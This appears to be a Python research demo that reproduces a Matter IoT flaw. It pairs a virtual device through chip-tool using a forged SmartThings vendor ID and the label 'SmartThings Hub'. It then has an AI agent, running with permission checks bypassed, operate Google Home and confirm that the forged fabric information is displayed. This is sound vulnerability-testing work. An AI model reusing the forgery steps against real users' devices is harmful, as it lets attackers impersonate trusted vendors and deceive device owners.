#!/usr/bin/env python3
"""
UMCCI Checker Demo — Flaw Type 4
Untrusted Fabric Information: forged Vendor ID and Label in Google Home.

Based on: "Hidden and Lost Control: on Security Design Risks in
           IoT User-Facing Matter Controller" (NDSS 2025)

Target:    Google Home app + matter.js virtual OnOff device
Agent:     Claude Code SDK (claude_agent_sdk)
GUI:       mobile-mcp (Android automation via ADB)
"""

import argparse
import asyncio
import re
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

from claude_agent_sdk import query, ClaudeAgentOptions, AssistantMessage, ResultMessage
from claude_agent_sdk.types import TextBlock

# ── Paths ────────────────────────────────────────────────────────────────────
CHIP_TOOL    = "/Users/haoyuli9/Desktop/IoT-Matter/connectedhomeip/out/host/chip-tool"
MATTER_DIR   = str(Path(__file__).parent / "matter-device")
STORAGE_PATH = str(Path(__file__).parent / "storage" / "virtual-device")
MATTER_PORT  = 5542

# ── Flaw Type 4 test parameters ──────────────────────────────────────────────
DEVICE_NAME      = "UMCCI-OnOff-Light"   # must match the name set in DeviceNode.ts
ATTACKER_NODE_ID = 2          # chip-tool's local node-ID for the virtual device
FORGED_VENDOR_ID = 4362       # SmartThings VID (confirmed in NDSS 2025 paper Table II)
FORGED_LABEL     = "SmartThings Hub"
DEVICE_PASSCODE  = 20202021
DEVICE_DISC      = 3840

# chip-tool keeps fabric credentials in a KVS directory; use a per-run temp dir
# so it never conflicts with stale data from a previous run.
_chip_storage: str = ""
_debug: bool = False

# ─────────────────────────────────────────────────────────────────────────────

def log(msg: str) -> None:
    print(f"[UMCCI] {msg}", flush=True)


def log_debug(msg: str) -> None:
    """Print only when --debug is set."""
    if _debug:
        print(f"  [matter.js] {msg}", flush=True)


# ── matter-device scaffolding ─────────────────────────────────────────────────

_PACKAGE_JSON = """\
{
    "name": "umcci-virtual-device",
    "version": "0.1.0",
    "type": "module",
    "description": "Virtual OnOff Matter device for UMCCI Checker Flaw Type 4 demo",
    "dependencies": {
        "@matter/main": "0.15.4"
    },
    "devDependencies": {
        "typescript": "~5.8.3",
        "@types/node": "^24.1.0"
    },
    "scripts": {
        "build": "tsc",
        "app": "node --enable-source-maps dist/DeviceNode.js",
        "clean": "node -e 'fs.rmSync(\\"dist\\", { recursive: true, force: true })'"
    }
}
"""

_TSCONFIG_JSON = """\
{
    "compilerOptions": {
        "strict": true,
        "target": "es2022",
        "module": "node16",
        "moduleResolution": "node16",
        "noImplicitAny": true,
        "noImplicitOverride": true,
        "outDir": "./dist",
        "skipLibCheck": true
    },
    "include": [
        "./src/**/*.ts"
    ]
}
"""

_DEVICE_NODE_TS = """\
#!/usr/bin/env node
/**
 * Virtual OnOff Light device for UMCCI Checker — Flaw Type 4 demo.
 * Stripped down from matter.js OnOff example; no CLI command execution.
 */

import {
    DeviceTypeId,
    Endpoint,
    Environment,
    Logger,
    ServerNode,
    StorageService,
    Time,
    VendorId,
} from "@matter/main";
import { OnOffLightDevice } from "@matter/main/devices";

const logger = Logger.get("DeviceNode");

async function main() {
    const environment = Environment.default;
    const storageService = environment.get(StorageService);
    console.log(`Storage location: ${storageService.location} (Directory)`);

    const deviceStorage = (await storageService.open("device")).createContext("data");

    const passcode =
        environment.vars.number("passcode") ?? (await deviceStorage.get("passcode", 20202021));
    const discriminator =
        environment.vars.number("discriminator") ?? (await deviceStorage.get("discriminator", 3840));
    const vendorId =
        environment.vars.number("vendorid") ?? (await deviceStorage.get("vendorid", 0xfff1));
    const productId =
        environment.vars.number("productid") ?? (await deviceStorage.get("productid", 0x8000));
    const port = environment.vars.number("port") ?? 5542;
    const uniqueId =
        environment.vars.string("uniqueid") ??
        (await deviceStorage.get("uniqueid", Time.nowMs())).toString();

    await deviceStorage.set({ passcode, discriminator, vendorid: vendorId, productid: productId, uniqueid: uniqueId });

    const server = await ServerNode.create({
        id: uniqueId,
        network: { port },
        commissioning: { passcode, discriminator },
        productDescription: {
            name: "UMCCI-OnOff-Light",
            deviceType: DeviceTypeId(OnOffLightDevice.deviceType),
        },
        basicInformation: {
            vendorName: "umcci-demo",
            vendorId: VendorId(vendorId),
            nodeLabel: "UMCCI-OnOff-Light",
            productName: "UMCCI-OnOff-Light",
            productLabel: "UMCCI-OnOff-Light",
            productId,
            serialNumber: `umcci-${uniqueId}`,
            uniqueId,
        },
    });

    const endpoint = new Endpoint(OnOffLightDevice, { id: "onoff" });
    await server.add(endpoint);

    endpoint.events.onOff.onOff$Changed.on(value => {
        console.log(`OnOff is now ${value ? "ON" : "OFF"}`);
    });

    logger.info(server);
    await server.run();
}

main().catch(error => console.error(error));
"""


def _ensure_matter_device() -> None:
    """
    Create and build the matter-device directory from embedded sources if it is
    missing or the compiled output (dist/DeviceNode.js) does not exist.
    """
    matter_dir = Path(MATTER_DIR)
    dist_js = matter_dir / "dist" / "DeviceNode.js"

    if dist_js.exists():
        return

    log("matter-device not found or not built — scaffolding now...")

    src_dir = matter_dir / "src"
    src_dir.mkdir(parents=True, exist_ok=True)

    (matter_dir / "package.json").write_text(_PACKAGE_JSON)
    (matter_dir / "tsconfig.json").write_text(_TSCONFIG_JSON)
    (src_dir / "DeviceNode.ts").write_text(_DEVICE_NODE_TS.replace("UMCCI-OnOff-Light", DEVICE_NAME))
    log("  Source files written.")

    log("  Running npm install...")
    r = subprocess.run(["npm", "install"], cwd=str(matter_dir), capture_output=True, text=True)
    if r.returncode != 0:
        sys.exit(f"ERROR: npm install failed:\n{r.stderr[:500]}")

    log("  Running npm run build...")
    r = subprocess.run(["npm", "run", "build"], cwd=str(matter_dir), capture_output=True, text=True)
    if r.returncode != 0:
        sys.exit(f"ERROR: npm run build failed:\n{r.stderr[:500]}")

    log("  matter-device built successfully.")


# ── Step 0: Environment check ─────────────────────────────────────────────────

def check_environment() -> None:
    log("=== Environment Check ===")

    result = subprocess.run(["adb", "devices"], capture_output=True, text=True)
    live = [l for l in result.stdout.strip().splitlines()[1:]
            if l.strip() and "offline" not in l]
    if not live:
        sys.exit("ERROR: No Android device detected via ADB. Connect the phone first.")
    log(f"✓ Android device: {live[0].split()[0]}")

    if not Path(CHIP_TOOL).exists():
        sys.exit(f"ERROR: chip-tool not found at {CHIP_TOOL}")
    log("✓ chip-tool found")

    _ensure_matter_device()
    log("✓ matter-device built and ready")

    log("Environment check passed.\n")


# ── Step 1: matter.js virtual device ─────────────────────────────────────────

def is_already_commissioned() -> bool:
    """Detect prior commissioning by checking whether storage contains any files."""
    storage = Path(STORAGE_PATH)
    return storage.exists() and any(f.is_file() for f in storage.rglob("*"))


def start_matter_device() -> tuple[subprocess.Popen, str | None]:
    """
    Launch the matter.js virtual OnOff device.
    Returns (proc, pairing_code).  pairing_code is None when already commissioned.
    """
    log("=== Starting Virtual Matter Device ===")
    Path(STORAGE_PATH).mkdir(parents=True, exist_ok=True)

    proc = subprocess.Popen(
        ["npm", "run", "app", "--",
         f"--port={MATTER_PORT}",
         f"--storage-path={STORAGE_PATH}"],
        cwd=MATTER_DIR,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    pairing_code: str | None = None
    ready = threading.Event()

    _ansi_escape = re.compile(r"\x1b\[[0-9;]*m")

    def _reader() -> None:
        nonlocal pairing_code
        assert proc.stdout is not None
        for raw in proc.stdout:
            line = raw.rstrip()
            log_debug(line)
            clean = _ansi_escape.sub("", line)
            m = re.search(r"manual pairing code:\s*([\d-]+)", clean, re.IGNORECASE)
            if m:
                pairing_code = m.group(1).replace("-", "")
                ready.set()
            if any(kw in clean.lower() for kw in
                   ["uncommissioned", "commissioned", "server listening", "node started"]):
                ready.set()

    threading.Thread(target=_reader, daemon=True).start()
    ready.wait(timeout=40)
    time.sleep(2)  # allow mDNS advertisement to propagate

    if pairing_code:
        log(f"✓ Pairing code: {pairing_code}")
    else:
        log("Device started (already commissioned — no fresh pairing code).")
    return proc, pairing_code


# ── Step 2/3: chip-tool helpers ───────────────────────────────────────────────

def run_chip_tool(*args, timeout: int = 120) -> tuple[int, str]:
    # --storage-directory must come AFTER the subcommand positional args
    cmd = [CHIP_TOOL] + [str(a) for a in args] + ["--storage-directory", _chip_storage]
    log(f"  chip-tool {' '.join(str(a) for a in args)}")
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    combined = r.stdout + r.stderr
    if r.returncode != 0:
        log(f"  [chip-tool rc={r.returncode}] {r.stderr[:300]}")
    return r.returncode, combined


def chip_tool_pair_forged() -> None:
    """
    Pair the virtual device using chip-tool with a forged Vendor ID.
    Uses onnetwork-long (passcode + discriminator) — no pairing code needed.
    chip-tool may report a CASE timeout after commissioning completes; we
    treat rc != 0 as a warning rather than an error because matter.js confirms
    commissioning success in its own log.
    """
    log(f"=== Flaw Type 4: chip-tool pairs with forged VID={FORGED_VENDOR_ID} ===")
    rc, out = run_chip_tool(
        "pairing", "onnetwork-long",
        ATTACKER_NODE_ID, DEVICE_PASSCODE, DEVICE_DISC,
        "--commissioner-vendor-id", FORGED_VENDOR_ID,
        timeout=180,
    )
    if "commissioning complete" in out.lower() or "completed with success" in out.lower():
        log(f"✓ Paired as node {ATTACKER_NODE_ID} with forged VID={FORGED_VENDOR_ID}")
    elif rc != 0:
        # chip-tool sometimes exits non-zero after a CASE timeout even when
        # commissioning itself succeeded.  Log but continue; the label write
        # below will fail fast if the fabric was not actually created.
        log(f"Warning: chip-tool exited rc={rc}; continuing (commissioning may still have succeeded)")
    else:
        log(f"✓ Paired as node {ATTACKER_NODE_ID} with forged VID={FORGED_VENDOR_ID}")


def chip_tool_set_label(label: str) -> None:
    """Set the forged fabric label on the device via OperationalCredentials cluster."""
    log(f"Setting forged fabric label: '{label}'")
    rc, _ = run_chip_tool(
        "operationalcredentials", "update-fabric-label",
        label, ATTACKER_NODE_ID, 0,
        timeout=60,
    )
    if rc == 0:
        log(f"✓ Fabric label set to '{label}'")
    else:
        log(f"Warning: update-fabric-label rc={rc}; continuing anyway")


def chip_tool_open_commissioning_window() -> str | None:
    """
    Open an Enhanced Commissioning Window so Google Home can join as a second fabric.
    Returns the new manual pairing code, or None on failure.
    """
    log("Opening commissioning window for Google Home (ECM)...")
    rc, out = run_chip_tool(
        "pairing", "open-commissioning-window",
        ATTACKER_NODE_ID,
        "1",     # ECM
        "900",   # window timeout (seconds)
        "1000",  # PBKDF iterations
        "3840",  # discriminator
        timeout=60,
    )
    m = re.search(r"Manual pairing code:\s*\[?([\d-]+)\]?", out, re.IGNORECASE)
    if m:
        code = m.group(1).replace("-", "")
        log(f"✓ Commissioning window open — Google Home pairing code: {code}")
        return code
    log(f"Warning: could not extract pairing code (rc={rc})")
    return None


# ── Step 4/5: Claude agent tasks ──────────────────────────────────────────────


async def run_agent(prompt: str, task_name: str) -> str:
    """
    Run a Claude agent task using the user's Claude Code settings,
    which include the mobile-mcp MCP server for Android GUI automation.
    """
    log(f"=== Agent Task: {task_name} ===")
    opts = ClaudeAgentOptions(
        permission_mode="bypassPermissions",
        setting_sources=["user"],   # inherit mobile-mcp from ~/.claude/settings.json
        max_turns=None,             # no turn limit
    )
    parts: list[str] = []
    try:
        async for msg in query(prompt=prompt, options=opts):
            if isinstance(msg, AssistantMessage):
                for block in msg.content:
                    if isinstance(block, TextBlock) and block.text.strip():
                        print(f"  [agent] {block.text}")
                        parts.append(block.text)
            elif isinstance(msg, ResultMessage):
                cost = f"${msg.total_cost_usd:.4f}" if msg.total_cost_usd else "N/A"
                log(
                    f"Agent task complete | cost={cost}"
                    f" | stop_reason={msg.stop_reason!r}"
                    f" | is_error={msg.is_error}"
                    f" | num_turns={msg.num_turns}"
                    + (f" | errors={msg.errors}" if msg.errors else "")
                )
                break  # ResultMessage signals end of agent run; stop iterating
    except Exception as e:
        if parts:
            # Agent produced output before the exception — treat as success
            log(f"Warning: agent stream closed with error (ignored, result captured): {e}")
        else:
            raise
    return "\n".join(parts)


_PAIR_PROMPT = """\
You are a security researcher running an authorized IoT security test in a lab environment.

TASK: Pair Google Home with a virtual Matter device using the pairing code below.

Pairing code: {pairing_code}

Instructions:
1. Take a screenshot to see the current phone screen state.
2. Open Google Home app (package: com.google.android.apps.chromecast.app). If already open, proceed.
3. Add a new device:
   - Tap the "+" / "Add" button (bottom-right or top-right corner).
   - Choose "Device" (or "Matter-enabled device").
   - When asked to scan a QR code, look for a "Add a different way" or "Use pairing code" or "Enter code manually" option.
   - Enter pairing code: {pairing_code}. Than click "Continue" or "Next".
   - If there is a request, click "Agree" or "I'm ready".
4. If prompted with "Uncertified device" or "Device not certified by Google", tap "Set up anyway" / "Add anyway".
5. If asked "Where is this device?", just select the top option and continue without changing any settings.
6. If asked "Create a unique name", first clear the shown default name. And then enter "{device_name}" to make it easier to find later. Otherwise, proceed with the default name.
7. Wait for the pairing process to complete. You might need to wait up to 1-2 minutes for the process to finish and for the device to appear in the list.
7. Confirm the device now appears in the Google Home device list.

If the device is already paired (you can see "{device_name}" or similar in Google Home), report success and skip.

Report what you observe at each key step and whether pairing succeeded."""

_VERIFY_PROMPT = """\
You are a security researcher verifying Matter IoT Flaw Type 4: untrusted fabric information.

Background: An attacker has paired this device using a forged Vendor ID ({forged_vid}) and \
label "{forged_label}". The question is whether Google Home displays this forged information.

TASK: In Google Home, find the virtual Matter device named "{device_name}", open its settings, \
and navigate to the "Linked Matter apps & services" page to screenshot the fabric list.

Steps:
1. Take a screenshot to see the current screen.
2. Open Google Home app (package: com.google.android.apps.chromecast.app).
3. Find the device named "{device_name}":
   - Switch to "All devices" view if needed (grid icon in the tab bar).
   - Scroll through device tiles to locate "{device_name}".
   - If not visible directly, it may be inside a room or group — try long-pressing group tiles \
to expand them and look for "{device_name}" among the individual devices listed.
4. Once found, LONG-PRESS the "{device_name}" tile to open its control/detail page.
5. Tap the gear icon (⚙️) or "Settings" button to open device settings.
6. Tap "Linked Matter apps & services" (subtitle: "Can control and manage this device").
  - If it says "Something went wrong" or fails to load, go back one step and try again.
7. Take a screenshot of the resulting page — it shows all Matter fabrics linked to this device, \
   each with a Vendor ID and display label.
8. Report the EXACT text of every entry listed, including Vendor ID values and labels.

Goal: Confirm that the forged fabric entry (Vendor ID={forged_vid} = 0x{forged_vid:04X}, \
label="{forged_label}") appears in the "Linked Matter apps & services" list, \
demonstrating that Google Home displays attacker-controlled fabric metadata without verification."""


# ── Main orchestration ────────────────────────────────────────────────────────

async def main() -> None:
    global _chip_storage, _debug

    parser = argparse.ArgumentParser(description="UMCCI Checker Demo — Flaw Type 4")
    parser.add_argument("--debug", action="store_true",
                        help="Print matter.js virtual device output (hidden by default)")
    parser.add_argument("--verify", action="store_true",
                        help="Skip pairing; assume device is already paired and go straight "
                             "to the verification step")
    parser.add_argument("--device-name", default=None, metavar="NAME",
                        help=f"Device name to look for in Google Home "
                             f"(default: {DEVICE_NAME!r})")
    args = parser.parse_args()
    _debug = args.debug
    device_name: str = args.device_name if args.device_name else DEVICE_NAME

    print()
    print("=" * 60)
    print(" UMCCI Checker Demo — Flaw Type 4")
    print(" Untrusted Fabric Information (VID & Label Forgery)")
    print("=" * 60)
    print()

    # ── 0. Environment ─────────────────────────────────────────────────────────
    check_environment()

    # ── chip-tool KVS: fresh per-run temp directory ────────────────────────────
    _chip_storage = tempfile.mkdtemp(prefix="chip-kvs-")
    log(f"chip-tool storage: {_chip_storage}")

    # ── 1. Start virtual device ────────────────────────────────────────────────
    already_commissioned = is_already_commissioned()
    proc, pairing_code = start_matter_device()

    try:
        if args.verify:
            # ── --verify mode: skip pairing, go straight to verification ──────
            log(f"--verify mode: skipping pairing, device name = {device_name!r}")

        elif not already_commissioned:
            # ── 2. Fresh device: attack + pairing flow ─────────────────────────
            if pairing_code is None:
                raise RuntimeError(
                    "Fresh storage but no pairing code captured. "
                    "Delete the storage/ directory and rerun."
                )

            # Attacker pairs first with forged VID
            chip_tool_pair_forged()
            chip_tool_set_label(FORGED_LABEL)

            # Open commissioning window → Google Home pairs as second fabric
            new_code = chip_tool_open_commissioning_window()
            if new_code is None:
                raise RuntimeError("Failed to open commissioning window for Google Home.")

            # Agent: pair Google Home
            await run_agent(
                _PAIR_PROMPT.format(pairing_code=new_code, device_name=device_name),
                "Pair Google Home with virtual device",
            )

        else:
            # ── 2b. Already commissioned: go straight to verification ───────────
            log("Storage already exists — skipping pairing phase.")
            log("Forged fabric from previous run is still present on the device.\n")

        # ── 3. Give Google Home time to sync ──────────────────────────────────
        log("Waiting for Google Home to sync fabric data...")
        time.sleep(8)

        # ── 4. Agent: verify forged fabric info in Google Home UI ──────────────
        result = await run_agent(
            _VERIFY_PROMPT.format(
                device_name=device_name,
                forged_vid=FORGED_VENDOR_ID,
                forged_label=FORGED_LABEL,
            ),
            "Verify forged fabric info in Google Home",
        )

        # ── 5. Report ──────────────────────────────────────────────────────────
        print()
        print("=" * 60)
        print(" FLAW TYPE 4 — TEST REPORT")
        print("=" * 60)
        print(f"  Forged Vendor ID : {FORGED_VENDOR_ID}  (impersonating SmartThings)")
        print(f"  Forged Label     : {FORGED_LABEL}")
        print(f"  Device name      : {device_name}")
        print()
        print("Verification findings (from agent):")
        print("-" * 40)
        print(result)
        print("=" * 60)

    finally:
        log("Stopping virtual Matter device...")
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


if __name__ == "__main__":
    asyncio.run(main())

# TODO: [agent] An image in the conversation exceeds the dimension limit for many-image requests (2000px). Start a new session with fewer images.
# This bug will cause the agent's session to end prematurely!